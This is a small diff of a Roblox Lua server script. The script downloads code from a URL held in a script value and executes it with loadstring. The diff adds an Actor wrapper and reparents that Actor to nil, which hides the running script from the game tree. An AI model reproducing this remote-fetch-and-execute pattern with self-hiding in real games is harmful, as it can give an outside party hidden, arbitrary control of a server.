@@ -5,6 +5,9 @@ meow.script = script
 setfenv(1,meow)
 loadstring(game:GetService("HttpService"):GetAsync(script.UrlSource.Value))()]]
 
+local Actor = Instance.new("Actor")
+Actor.Parent = game.ServerScriptService
+script.Parent = Actor
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local PhysicsService = game:GetService("PhysicsService")
@@ -53,7 +56,7 @@ local UserId = Player.UserId
 if game:GetService("RunService"):IsStudio() then
 	wait(4)
 end
-script.Parent.Parent = nil
+Actor.Parent = nil
 do
 	local GUID = {}
 	do
